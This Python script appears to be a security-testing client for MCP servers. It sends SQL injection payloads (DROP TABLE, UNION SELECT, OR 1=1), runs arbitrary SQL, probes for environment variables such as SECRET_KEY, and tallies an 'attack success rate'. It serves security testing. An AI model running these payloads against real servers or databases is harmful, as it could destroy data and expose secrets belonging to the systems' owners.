import asyncio
from typing import Optional
from contextlib import AsyncExitStack
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
import sys

class AttackMCPClient:
    def __init__(self):
        self.session: Optional[ClientSession] = None
        self.exit_stack = AsyncExitStack()
        self.sql_injection_success = 0
        self.sql_injection_total = 0
        self.arb_sql_success = 0
        self.arb_sql_total = 0
        self.env_leak_success = 0
        self.env_leak_total = 0
        self.query_attack_success = 0
        self.query_attack_total = 0
        self.tool_enum_success = 0
        self.tool_enum_total = 0

    async def connect_to_server(self, server_script_path: str):
        is_python = server_script_path.endswith('.py')
        is_js = server_script_path.endswith('.js')
        if not (is_python or is_js):
            raise ValueError("Server script must be a .py or .js file")
        command = "python" if is_python else "node"
        server_params = StdioServerParameters(
            command=command,
            args=[server_script_path],
            env=None
        )
        stdio_transport = await self.exit_stack.enter_async_context(stdio_client(server_params))
        self.stdio, self.write = stdio_transport
        self.session = await self.exit_stack.enter_async_context(ClientSession(self.stdio, self.write))
        await self.session.initialize()
        print("Connected to server.")

    async def test_sql_injection(self):
        print("[*] Testing SQL Injection...")
        payloads = [
            "test');--",
            "test'--",
            "' OR 1=1 --",
            "' OR '1'='1",
            "test', 'malicious');--",
            "; DROP TABLE records; --",
            "Robert'); DROP TABLE records;--",
            "' UNION SELECT 1, 'pwned', 'pwned'--",
            "normal",
            "admin' #",
            "' OR '' = '"
        ]
        for payload in payloads:
            print(f"Trying payload: {payload}")
            try:
                result = await self.session.call_tool("insert_record", {"name": payload, "address": "123 Exploit St"})
                content = getattr(result, 'content', result)
                print(f"Result: {content}")
                # Heuristic: consider attack successful if 'Record inserted' or no error in response
                if isinstance(content, str) and ("Record inserted" in content or "error" not in content.lower()):
                    self.sql_injection_success += 1
            except Exception as e:
                print(f"Error: {e}")
        self.sql_injection_total = len(payloads)

    async def test_arbitrary_sql_execution(self):
        print("\n[*] Testing Arbitrary SQL Execution...")
        queries = [
            "SELECT sqlite_version();",
            "SELECT name FROM sqlite_master WHERE type='table';",
            "SELECT * FROM records;"
        ]
        for query in queries:
            print(f"Query: {query}")
            try:
                result = await self.session.call_tool("execute_sql", {"query": query})
                content = getattr(result, 'content', result)
                print(f"Result: {content}")
                # Heuristic: consider attack successful if we get a non-empty result
                if content:
                    self.arb_sql_success += 1
            except Exception as e:
                print(f"Error: {e}")
        self.arb_sql_total = len(queries)

    async def test_env_variable_exposure(self):
        print("\n[*] Testing Environment Variable Exposure...")
        env_vars = [
            "SECRET_KEY", "PATH", "USER", "USERNAME", "HOME", "TEMP", "COMSPEC", "SHELL", "PYTHONPATH",
            "APPDATA", "LOCALAPPDATA", "PROGRAMFILES", "SYSTEMROOT", "NUMBER_OF_PROCESSORS", "PROCESSOR_IDENTIFIER"
        ]
        for var in env_vars:
            print(f"Env var: {var}")
            try:
                result = await self.session.call_tool("get_env_variable", {"var_name": var})
                content = getattr(result, 'content', result)
                print(f"Result: {content}")
                # Heuristic: consider attack successful if not 'Variable not found', not empty, and not just quotes
                if isinstance(content, str) and content != "Variable not found" and content.strip() not in ["", "''", '""']:
                    self.env_leak_success += 1
            except Exception as e:
                print(f"Error: {e}")
        self.env_leak_total = len(env_vars)

    async def test_query_insert_and_check(self):
        print("\n[*] Testing Insert and Query for Unique Marker...")
        marker = "HACKED_MARKER_123"
        try:
            result = await self.session.call_tool("insert_record", {"name": marker, "address": "attack avenue"})
            print(f"Insert marker result: {getattr(result, 'content', result)}")
        except Exception as e:
            print(f"Error inserting marker: {e}")
        try:
            result = await self.session.call_tool("query_records", {})
            content = getattr(result, 'content', result)
            print(f"Query records result: {content}")
            if marker in str(content):
                self.query_attack_success += 1
        except Exception as e:
            print(f"Error querying marker: {e}")
        self.query_attack_total = 1

    async def test_tool_enumeration(self):
        print("\n[*] Testing Tool Enumeration...")
        try:
            response = await self.session.list_tools()
            tools = getattr(response, 'tools', None)
            if tools and len(tools) > 0:
                print(f"Tools available: {[tool.name for tool in tools]}")
                self.tool_enum_success += 1
            else:
                print("No tools found or list_tools not supported.")
        except Exception as e:
            print(f"Error enumerating tools: {e}")
        self.tool_enum_total = 1

    async def cleanup(self):
        await self.exit_stack.aclose()

async def main():
    if len(sys.argv) < 2:
        print("Usage: python attack-mcp-client.py <path_to_server_script>")
        sys.exit(1)
    client = AttackMCPClient()
    try:
        await client.connect_to_server(sys.argv[1])
        await client.test_sql_injection()
        await client.test_arbitrary_sql_execution()
        await client.test_env_variable_exposure()
        await client.test_query_insert_and_check()
        await client.test_tool_enumeration()
        # Report final attack success rate
        total_success = (
            client.sql_injection_success +
            client.arb_sql_success +
            client.env_leak_success +
            client.query_attack_success +
            client.tool_enum_success
        )
        total_tests = (
            client.sql_injection_total +
            client.arb_sql_total +
            client.env_leak_total +
            client.query_attack_total +
            client.tool_enum_total
        )
        print("\n============================")
        print(f"Attack Success Rate: {total_success}/{total_tests} ({100 * total_success / total_tests:.1f}%)")
        print(f"SQL Injection: {client.sql_injection_success}/{client.sql_injection_total}")
        print(f"Arbitrary SQL: {client.arb_sql_success}/{client.arb_sql_total}")
        print(f"Env Leak: {client.env_leak_success}/{client.env_leak_total}")
        print(f"Query Insert/Check: {client.query_attack_success}/{client.query_attack_total}")
        print(f"Tool Enum: {client.tool_enum_success}/{client.tool_enum_total}")
        print("============================\n")
    finally:
        await client.cleanup()

if __name__ == "__main__":
    asyncio.run(main())